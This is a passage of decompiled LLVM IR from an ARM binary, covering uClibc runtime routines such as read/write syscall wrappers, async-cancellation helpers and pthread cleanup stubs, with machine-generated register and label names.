  %v9_1644c = load i32, i32* @r2, align 4
  %v12_1644c = load i32, i32* @r3, align 4
  %v15_1644c = load i32, i32* @r7, align 4
  store i32 %v15_1644c, i32* %stack_var_-8, align 4
  %v18_1644c = load i32, i32* @lr, align 4
  %v0_16450 = call i32 @__libc_enable_asynccancel()
  %v2_16458 = load i32, i32* %stack_var_-24, align 4
  store i32 %arg2, i32* @r1, align 4
  store i32 %v9_1644c, i32* @r2, align 4
  store i32 %v12_1644c, i32* @r3, align 4
  store i32 %v2_16458, i32* @r7, align 4
  %v1_1646c = call i32 @__libc_disable_asynccancel(i32 %v0_16450)
  %v0_16470 = load i32, i32* @r7, align 4
  store i32 %v0_16470, i32* @r0, align 4
  %v2_16474 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16474, i32* @r7, align 4
  store i32 %v18_1644c, i32* @lr, align 4
  %v2_16478 = icmp ugt i32 %v0_16470, -4097
  %v7_16478 = icmp eq i32 %v0_16470, -4096
  store i1 %v7_16478, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16478, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_1644c
  %v0_16480 = call i32 @__syscall_error()
  %v0_16490 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16490, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v1_16490 = load i32, i32* @r1, align 4
  %v2_16490 = load i32, i32* @r8, align 4
  %v3_16490 = udiv i32 %v2_16490, 536870912
  %v4_16490 = mul i32 %v2_16490, 8
  %v5_16490 = or i32 %v3_16490, %v4_16490
  %v8_16490 = and i32 %v5_16490, %v1_16490
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_16470, { 0, 2, 3, 1 }
  uselistorder i32 %v0_16440, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1644c, { 1, 0 }
}

define i32 @__GI___write_nocancel() local_unnamed_addr {
entry:
  %v0_164a4 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_164a4, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_164a4 = load i32, i32* @r0, align 4
  ret i32 %v2_164a4

bb1:                                              ; preds = %entry
  %v0_164a8 = call i32 @__syscall_error()
  ret i32 %v0_164a8
}

define i32 @__GI___libc_write(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_164b4 = load i32, i32* @global_var_273a4.724, align 4
  %v2_164b8 = icmp eq i32 %v3_164b4, 0
  store i1 %v2_164b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_164b8, label %dec_label_pc_164c0, label %entry.dec_label_pc_164dc_crit_edge

entry.dec_label_pc_164dc_crit_edge:               ; preds = %entry
  %v3_164dc.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_164dc

dec_label_pc_164c0:                               ; preds = %entry
  %v0_164d0 = load i32, i32* @r0, align 4
  %v2_164d0 = icmp ugt i32 %v0_164d0, -4097
  %v7_164d0 = icmp eq i32 %v0_164d0, -4096
  store i1 %v7_164d0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_164d0, label %bb9, label %bb

bb:                                               ; preds = %bb11, %bb10, %dec_label_pc_164dc, %dec_label_pc_164c0
  %merge = phi i32 [ %v0_164d0, %dec_label_pc_164c0 ], [ %v0_16500, %dec_label_pc_164dc ], [ %v0_16510, %bb10 ], [ %v9_16520, %bb11 ]
  ret i32 %merge

bb9:                                              ; preds = %dec_label_pc_164c0
  %v0_164d8 = call i32 @__syscall_error()
  br label %dec_label_pc_164dc

dec_label_pc_164dc:                               ; preds = %entry.dec_label_pc_164dc_crit_edge, %bb9
  %v3_164dc = phi i32 [ %v3_164dc.pre, %entry.dec_label_pc_164dc_crit_edge ], [ %v0_164d8, %bb9 ]
  %v12_164dc = load i32, i32* @r3, align 4
  %v15_164dc = load i32, i32* @r7, align 4
  store i32 %v15_164dc, i32* %stack_var_-8, align 4
  %v18_164dc = load i32, i32* @lr, align 4
  %v0_164e0 = call i32 @__libc_enable_asynccancel()
  store i32 %arg2, i32* @r1, align 4
  store i32 %v12_164dc, i32* @r3, align 4
  store i32 %v3_164dc, i32* @r7, align 4
  %v1_164fc = call i32 @__libc_disable_asynccancel(i32 %v0_164e0)
  %v0_16500 = load i32, i32* @r7, align 4
  store i32 %v0_16500, i32* @r0, align 4
  %v2_16504 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16504, i32* @r7, align 4
  store i32 %v18_164dc, i32* @lr, align 4
  %v2_16508 = icmp ugt i32 %v0_16500, -4097
  %v7_16508 = icmp eq i32 %v0_16500, -4096
  store i1 %v7_16508, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_16508, label %bb10, label %bb

bb10:                                             ; preds = %dec_label_pc_164dc
  %v0_16510 = call i32 @__syscall_error()
  %v0_16520 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_16520, label %bb11, label %bb

bb11:                                             ; preds = %bb10
  %v1_16520 = load i32, i32* @r1, align 4
  %v2_16520 = load i32, i32* @r8, align 4
  %v3_16520 = load i32, i32* @lr, align 4
  %v8_16520 = ashr i32 %v2_16520, %v3_16520
  %v9_16520 = and i32 %v8_16520, %v1_16520
  br label %bb

; uselistorder directives
  uselistorder i32 %v0_16500, { 0, 2, 3, 1 }
  uselistorder i32 %v0_164d0, { 1, 0, 2 }
  uselistorder label %dec_label_pc_164dc, { 1, 0 }
}

define i32 @__read_nocancel() local_unnamed_addr {
entry:
  %v0_16534 = load i1, i1* @cpsr_c, align 1
  br i1 %v0_16534, label %bb1, label %bb

bb:                                               ; preds = %entry
  %v2_16534 = load i32, i32* @r0, align 4
  ret i32 %v2_16534

bb1:                                              ; preds = %entry
  %v0_16538 = call i32 @__syscall_error()
  ret i32 %v0_16538
}

define i32 @__libc_read(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_16544 = load i32, i32* @global_var_273a4.724, align 4
  %v2_16548 = icmp eq i32 %v3_16544, 0
  br i1 %v2_16548, label %dec_label_pc_16550, label %entry.dec_label_pc_1656c_crit_edge

entry.dec_label_pc_1656c_crit_edge:               ; preds = %entry
  %v3_1656c.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_1656c

dec_label_pc_16550:                               ; preds = %entry
  %v0_16560 = load i32, i32* @r0, align 4
  %v2_16560 = icmp ugt i32 %v0_16560, -4097
  br i1 %v2_16560, label %bb8, label %bb

bb:                                               ; preds = %dec_label_pc_1656c, %dec_label_pc_16550
  %merge = phi i32 [ %v0_16560, %dec_label_pc_16550 ], [ %v0_16590, %dec_label_pc_1656c ]
  ret i32 %merge

bb8:                                              ; preds = %dec_label_pc_16550
  %v0_16568 = call i32 @__syscall_error()
  br label %dec_label_pc_1656c

dec_label_pc_1656c:                               ; preds = %entry.dec_label_pc_1656c_crit_edge, %bb8
  %v3_1656c = phi i32 [ %v3_1656c.pre, %entry.dec_label_pc_1656c_crit_edge ], [ %v0_16568, %bb8 ]
  %v15_1656c = load i32, i32* @r7, align 4
  store i32 %v15_1656c, i32* %stack_var_-8, align 4
  %v18_1656c = load i32, i32* @lr, align 4
  %v0_16570 = call i32 @__libc_enable_asynccancel()
  store i32 %v3_1656c, i32* @r7, align 4
  %v1_1658c = call i32 @__libc_disable_asynccancel(i32 %v0_16570)
  %v0_16590 = load i32, i32* @r7, align 4
  store i32 %v0_16590, i32* @r0, align 4
  %v2_16594 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_16594, i32* @r7, align 4
  store i32 %v18_1656c, i32* @lr, align 4
  %v2_16598 = icmp ugt i32 %v0_16590, -4097
  br i1 %v2_16598, label %bb9, label %bb

bb9:                                              ; preds = %dec_label_pc_1656c
  %v0_165a0 = call i32 @__syscall_error()
  ret i32 %v0_165a0

; uselistorder directives
  uselistorder i32 %v0_16590, { 1, 2, 0 }
  uselistorder i32 ()* @__syscall_error, { 3, 2, 11, 7, 6, 10, 1, 0, 9, 5, 4, 8 }
  uselistorder label %dec_label_pc_1656c, { 1, 0 }
}

define i32 @__libc_disable_asynccancel(i32 %arg1) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %stack_var_-16 = alloca i32, align 4
  %v0_165b0 = load i32, i32* %r0.global-to-local, align 4
  %v1_165b0 = and i32 %v0_165b0, 2
  %v2_165b0 = icmp eq i32 %v1_165b0, 0
  %v3_165b4 = load i32, i32* @r4, align 4
  store i32 %v3_165b4, i32* %stack_var_-16, align 4
  br i1 %v2_165b0, label %dec_label_pc_165bc, label %dec_label_pc_16630

dec_label_pc_165bc:                               ; preds = %entry
  %v0_165bc = call i32 @__aeabi_read_tp()
  store i32 %v0_165bc, i32* %r0.global-to-local, align 4
  %v1_165c0 = add i32 %v0_165bc, -1036
  %v2_165c0 = inttoptr i32 %v1_165c0 to i32*
  %v3_165c0 = load i32, i32* %v2_165c0, align 4
  %v1_165c4 = add i32 %v0_165bc, -1168
  store i32 %v1_165c4, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_165c8

dec_label_pc_165c8:                               ; preds = %dec_label_pc_165fc.dec_label_pc_165c8_crit_edge, %dec_label_pc_165bc
  %v0_165d4 = phi i32 [ %v0_165d4.pre, %dec_label_pc_165fc.dec_label_pc_165c8_crit_edge ], [ %v1_165c4, %dec_label_pc_165bc ]
  %v0_165c8 = phi i32 [ %v0_165fc, %dec_label_pc_165fc.dec_label_pc_165c8_crit_edge ], [ %v3_165c0, %dec_label_pc_165bc ]
  %v1_165c8 = and i32 %v0_165c8, -3
  store i32 %v1_165c8, i32* %r7.global-to-local, align 4
  store i32 %v0_165c8, i32* %r4.global-to-local, align 4
  store i32 %v1_165c8, i32* @r1, align 4
  %v1_165d4 = add i32 %v0_165d4, 132
  store i32 %v1_165d4, i32* @r2, align 4
  %v1_165d823 = inttoptr i32 %v1_165d4 to i32*
  %v2_165d824 = load i32, i32* %v1_165d823, align 4
  %v3_165dc26 = icmp uge i32 %v2_165d824, %v0_165c8
  store i1 %v3_165dc26, i1* %cpsr_c.global-to-local, align 1
  %v9_165dc32 = icmp eq i32 %v2_165d824, %v0_165c8
  br i1 %v9_165dc32, label %dec_label_pc_165e4, label %dec_label_pc_165fc

dec_label_pc_165e4:                               ; preds = %dec_label_pc_165c8, %dec_label_pc_165e4.dec_label_pc_165d8_crit_edge
  %v0_165e433 = phi i32 [ %v1_165dc.pre, %dec_label_pc_165e4.dec_label_pc_165d8_crit_edge ], [ %v0_165c8, %dec_label_pc_165c8 ]
  store i32 %v0_165e433, i32* %r0.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_165f4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_165f4, label %dec_label_pc_165f8, label %dec_label_pc_165e4.dec_label_pc_165d8_crit_edge

dec_label_pc_165e4.dec_label_pc_165d8_crit_edge:  ; preds = %dec_label_pc_165e4
  %v0_165d8.pre = load i32, i32* @r2, align 4
  %v1_165dc.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_165d8 = inttoptr i32 %v0_165d8.pre to i32*
  %v2_165d8 = load i32, i32* %v1_165d8, align 4
  %v3_165dc = icmp uge i32 %v2_165d8, %v1_165dc.pre
  store i1 %v3_165dc, i1* %cpsr_c.global-to-local, align 1
  %v9_165dc = icmp eq i32 %v2_165d8, %v1_165dc.pre
  br i1 %v9_165dc, label %dec_label_pc_165e4, label %dec_label_pc_165fc

dec_label_pc_165f8:                               ; preds = %dec_label_pc_165e4
  %v0_165f8 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_165fc

dec_label_pc_165fc:                               ; preds = %dec_label_pc_165c8, %dec_label_pc_165e4.dec_label_pc_165d8_crit_edge, %dec_label_pc_165f8
  %v0_165fc = phi i32 [ %v0_165f8, %dec_label_pc_165f8 ], [ %v2_165d824, %dec_label_pc_165c8 ], [ %v2_165d8, %dec_label_pc_165e4.dec_label_pc_165d8_crit_edge ]
  %v1_165fc = phi i32 [ %v0_165f8, %dec_label_pc_165f8 ], [ %v0_165c8, %dec_label_pc_165c8 ], [ %v1_165dc.pre, %dec_label_pc_165e4.dec_label_pc_165d8_crit_edge ]
  %v3_165fc = icmp uge i32 %v0_165fc, %v1_165fc
  store i1 %v3_165fc, i1* %cpsr_c.global-to-local, align 1
  %v9_165fc = icmp eq i32 %v0_165fc, %v1_165fc
  br i1 %v9_165fc, label %dec_label_pc_16624.preheader, label %dec_label_pc_165fc.dec_label_pc_165c8_crit_edge

dec_label_pc_165fc.dec_label_pc_165c8_crit_edge:  ; preds = %dec_label_pc_165fc
  %v0_165d4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_165c8

dec_label_pc_16624.preheader:                     ; preds = %dec_label_pc_165fc
  %v0_166241 = load i32, i32* %r7.global-to-local, align 4
  %v1_166242 = and i32 %v0_166241, 12
  store i32 %v1_166242, i32* @r3, align 4
  %v2_166283 = icmp ugt i32 %v1_166242, 3
  store i1 %v2_166283, i1* %cpsr_c.global-to-local, align 1
  %v7_166285 = icmp eq i32 %v1_166242, 4
  br i1 %v7_166285, label %dec_label_pc_16608.lr.ph, label %dec_label_pc_16624.preheader.dec_label_pc_16630.loopexit_crit_edge

dec_label_pc_16624.preheader.dec_label_pc_16630.loopexit_crit_edge: ; preds = %dec_label_pc_16624.preheader
  %v1_16634.pre.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_16630.loopexit

dec_label_pc_16608.lr.ph:                         ; preds = %dec_label_pc_16624.preheader
  %v0_1660c.pre = load i32, i32* %r5.global-to-local, align 4
  %v1_1660c = add i32 %v0_1660c.pre, 132
  %v2_16620 = inttoptr i32 %v1_1660c to i32*
  br label %dec_label_pc_16608

dec_label_pc_16608:                               ; preds = %dec_label_pc_16608.lr.ph, %dec_label_pc_16608
  %v0_16608 = phi i32 [ %v0_166241, %dec_label_pc_16608.lr.ph ], [ %v3_16620, %dec_label_pc_16608 ]
  store i32 %v0_16608, i32* @r2, align 4
  store i32 %v1_1660c, i32* %r0.global-to-local, align 4
  store i32 128, i32* @r1, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  %v3_16620 = load i32, i32* %v2_16620, align 4
  store i32 %v3_16620, i32* %r7.global-to-local, align 4
  %v1_16624 = and i32 %v3_16620, 12
  store i32 %v1_16624, i32* @r3, align 4
  %v7_16628 = icmp eq i32 %v1_16624, 4
  br i1 %v7_16628, label %dec_label_pc_16608, label %dec_label_pc_16624.dec_label_pc_16630.loopexit_crit_edge

dec_label_pc_16624.dec_label_pc_16630.loopexit_crit_edge: ; preds = %dec_label_pc_16608
  %v2_16628 = icmp ugt i32 %v1_16624, 3
  store i1 %v2_16628, i1* %cpsr_c.global-to-local, align 1
  br label %dec_label_pc_16630.loopexit

dec_label_pc_16630.loopexit:                      ; preds = %dec_label_pc_16624.preheader.dec_label_pc_16630.loopexit_crit_edge, %dec_label_pc_16624.dec_label_pc_16630.loopexit_crit_edge
  %v1_16634.pre = phi i32 [ %v1_16634.pre.pre, %dec_label_pc_16624.preheader.dec_label_pc_16630.loopexit_crit_edge ], [ %v1_1660c, %dec_label_pc_16624.dec_label_pc_16630.loopexit_crit_edge ]
  %v2_16630.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_16630

dec_label_pc_16630:                               ; preds = %dec_label_pc_16630.loopexit, %entry
  %v1_16634 = phi i32 [ %v1_16634.pre, %dec_label_pc_16630.loopexit ], [ %v0_165b0, %entry ]
  %v2_16630 = phi i32 [ %v2_16630.pre, %dec_label_pc_16630.loopexit ], [ %v3_165b4, %entry ]
  store i32 %v2_16630, i32* @r4, align 4
  ret i32 %v1_16634

; uselistorder directives
  uselistorder i32 %v3_16620, { 1, 2, 0 }
  uselistorder i32 %v1_1660c, { 0, 2, 1 }
  uselistorder i32 %v0_165f8, { 1, 0 }
  uselistorder i32 %v1_165dc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_165c8, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 2, 4, 3, 5, 0, 1 }
  uselistorder i1* %cpsr_c.global-to-local, { 0, 1, 3, 5, 4, 2 }
  uselistorder label %dec_label_pc_16630.loopexit, { 1, 0 }
  uselistorder label %dec_label_pc_16608, { 1, 0 }
  uselistorder label %dec_label_pc_165fc, { 2, 1, 0 }
  uselistorder label %dec_label_pc_165e4, { 1, 0 }
}

define i32 @__libc_enable_asynccancel() local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_16638 = load i32, i32* @r4, align 4
  store i32 %v3_16638, i32* %stack_var_-24, align 4
  store i32 ptrtoint (i32* @global_var_daa4.730 to i32), i32* %r8.global-to-local, align 4
  %v0_16640 = call i32 @__aeabi_read_tp()
  %v1_16644 = add i32 %v0_16640, -1036
  %v2_16644 = inttoptr i32 %v1_16644 to i32*
  %v3_16644 = load i32, i32* %v2_16644, align 4
  store i32 %v3_16644, i32* %r6.global-to-local, align 4
  %v1_16648 = add i32 %v0_16640, -1168
  store i32 %v1_16648, i32* %r7.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_240f8.537 to i32), i32* %r8.global-to-local, align 4
  %v1_1665046 = or i32 %v3_16644, 2
  store i32 %v1_1665046, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_1665449 = icmp eq i32 %v1_1665046, %v3_16644
  br i1 %v9_1665449, label %dec_label_pc_16700, label %dec_label_pc_1665c

dec_label_pc_1665c:                               ; preds = %entry, %bb.dec_label_pc_1665c_crit_edge
  %v0_16660 = phi i32 [ %v0_16660.pre, %bb.dec_label_pc_1665c_crit_edge ], [ %v1_16648, %entry ]
  %v0_1666450 = phi i32 [ %v1_16690, %bb.dec_label_pc_1665c_crit_edge ], [ %v3_16644, %entry ]
  %v1_16660 = add i32 %v0_16660, 132
  store i32 %v1_16660, i32* @r2, align 4
  store i32 %v0_1666450, i32* %r4.global-to-local, align 4
  %v1_1666834 = inttoptr i32 %v1_16660 to i32*
  %v2_1666835 = load i32, i32* %v1_1666834, align 4
  store i32 %v2_1666835, i32* @r3, align 4
  %v3_1666c37 = icmp uge i32 %v2_1666835, %v0_1666450
  store i1 %v3_1666c37, i1* %cpsr_c.global-to-local, align 1
  %v9_1666c43 = icmp eq i32 %v2_1666835, %v0_1666450
  br i1 %v9_1666c43, label %dec_label_pc_16674, label %dec_label_pc_1668c

dec_label_pc_16674:                               ; preds = %dec_label_pc_1665c, %dec_label_pc_16674.dec_label_pc_16668_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_16684 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_16684, label %dec_label_pc_16688, label %dec_label_pc_16674.dec_label_pc_16668_crit_edge

dec_label_pc_16674.dec_label_pc_16668_crit_edge:  ; preds = %dec_label_pc_16674
  %v0_16668.pre = load i32, i32* @r2, align 4
  %v1_1666c.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_16668 = inttoptr i32 %v0_16668.pre to i32*
  %v2_16668 = load i32, i32* %v1_16668, align 4
  store i32 %v2_16668, i32* @r3, align 4
  %v3_1666c = icmp uge i32 %v2_16668, %v1_1666c.pre
  store i1 %v3_1666c, i1* %cpsr_c.global-to-local, align 1
  %v9_1666c = icmp eq i32 %v2_16668, %v1_1666c.pre
  br i1 %v9_1666c, label %dec_label_pc_16674, label %dec_label_pc_1668c

dec_label_pc_16688:                               ; preds = %dec_label_pc_16674
  %v0_16688 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_16688, i32* @r3, align 4
  br label %dec_label_pc_1668c

dec_label_pc_1668c:                               ; preds = %dec_label_pc_1665c, %dec_label_pc_16674.dec_label_pc_16668_crit_edge, %dec_label_pc_16688
  %v1_16690 = phi i32 [ %v0_16688, %dec_label_pc_16688 ], [ %v2_1666835, %dec_label_pc_1665c ], [ %v2_16668, %dec_label_pc_16674.dec_label_pc_16668_crit_edge ]
  %v1_1668c = load i32, i32* %r6.global-to-local, align 4
  %v3_1668c = icmp uge i32 %v1_16690, %v1_1668c
  store i1 %v3_1668c, i1* %cpsr_c.global-to-local, align 1
  %v9_1668c = icmp eq i32 %v1_16690, %v1_1668c
  br i1 %v9_1668c, label %dec_label_pc_16698, label %bb

bb:                                               ; preds = %dec_label_pc_1668c
  store i32 %v1_16690, i32* %r6.global-to-local, align 4
  %v1_16650 = or i32 %v1_16690, 2
  store i32 %v1_16650, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_16654 = icmp eq i32 %v1_16650, %v1_16690
  br i1 %v9_16654, label %dec_label_pc_16700, label %bb.dec_label_pc_1665c_crit_edge

bb.dec_label_pc_1665c_crit_edge:                  ; preds = %bb
  %v0_16660.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_1665c

dec_label_pc_16698:                               ; preds = %dec_label_pc_1668c
  %v0_16698 = load i32, i32* %r5.global-to-local, align 4
  %v1_16698 = and i32 %v0_16698, -69
  store i32 %v1_16698, i32* @r3, align 4
  %v2_1669c = icmp ugt i32 %v1_16698, 9
  store i1 %v2_1669c, i1* %cpsr_c.global-to-local, align 1
  %v7_1669c = icmp eq i32 %v1_16698, 10
  br i1 %v7_1669c, label %dec_label_pc_166a4, label %dec_label_pc_16700

dec_label_pc_166a4:                               ; preds = %dec_label_pc_16698
  %v1_166a8 = load i32, i32* %r7.global-to-local, align 4
  %v2_166a8 = add i32 %v1_166a8, 544
  %v3_166a8 = inttoptr i32 %v2_166a8 to i32*
  store i32 -1, i32* %v3_166a8, align 4
  %v0_166ac = load i32, i32* @r2, align 4
  store i32 %v0_166ac, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_166b0

dec_label_pc_166b0:                               ; preds = %dec_label_pc_166e4.dec_label_pc_166b0_crit_edge, %dec_label_pc_166a4
  %v0_166b4 = phi i32 [ %v0_166b4.pre, %dec_label_pc_166e4.dec_label_pc_166b0_crit_edge ], [ %v0_166ac, %dec_label_pc_166a4 ]
  %v0_166b0 = load i32, i32* %r7.global-to-local, align 4
  %v1_166b0 = add i32 %v0_166b0, 132
  %v2_166b0 = inttoptr i32 %v1_166b0 to i32*
  %v3_166b0 = load i32, i32* %v2_166b0, align 4
  store i32 %v0_166b4, i32* @r2, align 4
  store i32 %v3_166b0, i32* %r4.global-to-local, align 4
  %v1_166c022 = inttoptr i32 %v0_166b4 to i32*
  %v2_166c023 = load i32, i32* %v1_166c022, align 4
  %v3_166c425 = icmp uge i32 %v2_166c023, %v3_166b0
  store i1 %v3_166c425, i1* %cpsr_c.global-to-local, align 1
  %v9_166c431 = icmp eq i32 %v2_166c023, %v3_166b0
  br i1 %v9_166c431, label %dec_label_pc_166cc, label %dec_label_pc_166e4

dec_label_pc_166cc:                               ; preds = %dec_label_pc_166b0, %dec_label_pc_166cc.dec_label_pc_166c0_crit_edge
  call void @__pseudo_branch(i32 -61504)
  %v0_166dc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_166dc, label %dec_label_pc_166e0, label %dec_label_pc_166cc.dec_label_pc_166c0_crit_edge

dec_label_pc_166cc.dec_label_pc_166c0_crit_edge:  ; preds = %dec_label_pc_166cc
  %v0_166c0.pre = load i32, i32* @r2, align 4
  %v1_166c4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_166c0 = inttoptr i32 %v0_166c0.pre to i32*
  %v2_166c0 = load i32, i32* %v1_166c0, align 4
  %v3_166c4 = icmp uge i32 %v2_166c0, %v1_166c4.pre
  store i1 %v3_166c4, i1* %cpsr_c.global-to-local, align 1
  %v9_166c4 = icmp eq i32 %v2_166c0, %v1_166c4.pre
  br i1 %v9_166c4, label %dec_label_pc_166cc, label %dec_label_pc_166e4

dec_label_pc_166e0:                               ; preds = %dec_label_pc_166cc
  %v0_166e0 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_166e4

dec_label_pc_166e4:                               ; preds = %dec_label_pc_166b0, %dec_label_pc_166cc.dec_label_pc_166c0_crit_edge, %dec_label_pc_166e0
  %v0_166e4 = phi i32 [ %v0_166e0, %dec_label_pc_166e0 ], [ %v2_166c023, %dec_label_pc_166b0 ], [ %v2_166c0, %dec_label_pc_166cc.dec_label_pc_166c0_crit_edge ]
  %v1_166e4 = phi i32 [ %v0_166e0, %dec_label_pc_166e0 ], [ %v3_166b0, %dec_label_pc_166b0 ], [ %v1_166c4.pre, %dec_label_pc_166cc.dec_label_pc_166c0_crit_edge ]
  %v3_166e4 = icmp uge i32 %v0_166e4, %v1_166e4
  store i1 %v3_166e4, i1* %cpsr_c.global-to-local, align 1
  %v9_166e4 = icmp eq i32 %v0_166e4, %v1_166e4
  br i1 %v9_166e4, label %dec_label_pc_166ec, label %dec_label_pc_166e4.dec_label_pc_166b0_crit_edge

dec_label_pc_166e4.dec_label_pc_166b0_crit_edge:  ; preds = %dec_label_pc_166e4
  %v0_166b4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_166b0

dec_label_pc_166ec:                               ; preds = %dec_label_pc_166e4
  store i32 116, i32* @r3, align 4
  %v0_166f4 = load i32, i32* %r8.global-to-local, align 4
  %v2_166f4 = add i32 %v0_166f4, 116
  %v3_166f4 = inttoptr i32 %v2_166f4 to i32*
  %v4_166f4 = load i32, i32* %v3_166f4, align 4
  store i32 %v4_166f4, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_166f4)
  %v0_16700.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_16700

dec_label_pc_16700:                               ; preds = %entry, %bb, %dec_label_pc_16698, %dec_label_pc_166ec
  %v0_16700 = phi i32 [ %v1_16690, %dec_label_pc_16698 ], [ %v0_16700.pre, %dec_label_pc_166ec ], [ %v3_16644, %entry ], [ %v1_16690, %bb ]
  %v2_16704 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_16704, i32* @r4, align 4
  ret i32 %v0_16700

; uselistorder directives
  uselistorder i32 %v0_166e0, { 1, 0 }
  uselistorder i32 %v1_166c4.pre, { 0, 2, 1 }
  uselistorder i32 %v1_1668c, { 1, 0 }
  uselistorder i32 %v1_16690, { 0, 1, 4, 3, 5, 6, 7, 2 }
  uselistorder i32 %v1_1666c.pre, { 1, 0 }
  uselistorder i32 %v0_1666450, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 5, 4, 0, 6, 10, 7, 9, 8, 1, 2 }
  uselistorder i32 544, { 8, 2, 3, 6, 0, 1, 4, 5, 7 }
  uselistorder i32 -1036, { 1, 2, 0 }
  uselistorder label %dec_label_pc_16700, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_166e4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_166cc, { 1, 0 }
  uselistorder label %dec_label_pc_1668c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_16674, { 1, 0 }
  uselistorder label %dec_label_pc_1665c, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_16724 = add i32 %tmp, 4
  %v4_16724 = inttoptr i32 %v3_16724 to i32*
  store i32 %arg3, i32* %v4_16724, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_16730 = icmp eq i32 %arg2, 0
  br i1 %v2_16730, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_1673c = add i32 %tmp, 4
  %v3_1673c = inttoptr i32 %v2_1673c to i32*
  %v4_1673c = load i32, i32* %v3_1673c, align 4
  store i32 %v4_1673c, i32* %r0.global-to-local, align 4
  %v3_16740 = load i32, i32* %arg1, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %.02 = phi i32 [ %v3_16740, %bb ], [ undef, %entry ]
  %v2_16748 = xor i1 %v2_16730, true
  call void @__pseudo_cond_branch(i1 %v2_16748, i32 %.02)
  %v1_16754 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_16754

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_1677c.lr.ph:
  %r4.global-to-local = alloca i32, align 4
